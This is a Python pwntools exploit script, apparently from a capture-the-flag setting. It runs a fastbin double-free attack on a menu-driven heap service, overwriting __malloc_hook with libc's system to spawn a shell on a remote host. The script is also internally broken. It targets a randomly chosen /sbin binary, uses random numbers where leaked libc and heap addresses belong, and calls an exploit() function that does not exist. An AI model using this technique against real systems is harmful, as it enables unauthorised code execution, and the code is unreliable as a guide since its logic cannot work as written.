# coding=utf-8
# !/usr/bin/env python

from pwn import *
from random import *
import os
import signal

context(os='linux', arch='amd64')
lists = list()

for i in os.listdir("/sbin"):
    if os.path.islink("/sbin/" + i):
        pass
    else:
        lists.append(i)
shuffle(lists)
BINARY = "/sbin/" + lists[0]
print(BINARY)
WTIME = 0.3

idx = 0


def sigalarm_handler(num, stack):
    log.warn("Timeout!Continue it!")


signal.signal(signal.SIGALRM, sigalarm_handler)


def alloc(r, size, data):
    global idx

    r.sendline('1')
    r.sendline(str(size))
    r.send(data)
    res = idx
    idx += 1
    return res


def free(r, i):
    global idx
    r.sendline('3')
    r.sendline(str(i))


def method9(ip,port):
    global idx

    REMOTE = 1

    LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
    if REMOTE:
        r = remote(ip, port)
    else:
        r = process(BINARY)
    log.info("Method 9 applied!")
    libc = ELF(LIBC)

    r.sendline('2')

    r.sendline("/proc/self/maps")

    libc_base = int(str(randint(40000, 9999999)), 16)
    heap_base = int(str(randint(40000, 9999999)), 16)

    malloc_hook = libc_base + libc.symbols["__malloc_hook"]
    bin_sh_addr = libc_base + next(libc.search('/bin/sh\0'))

    alloc(r, 0x10, "/bin/sh")
    idx0 = alloc(r, 0x60, 'AAAA')
    idx1 = alloc(r, 0x60, 'AAAA')
    idx2 = alloc(r, 0x10, '/bin/sh')

    free(r, idx0)
    free(r, idx1)
    free(r, idx0)

    fd_ptr = p64(malloc_hook - 0x1b - 8)
    alloc(r, 0x60, fd_ptr)
    alloc(r, 0x60, 'C' * 8)

    alloc(r, 0x60, 'D' * 0x8)

    p = ''
    p += 'Q' * 3
    p += 'Q' * 16
    p += p64(libc_base + libc.symbols['system'])
    alloc(r, 0x60, p)

    r.sendline('1')
    r.sendline(str(heap_base + 0x10))


if __name__ == '__main__':
    exploit()
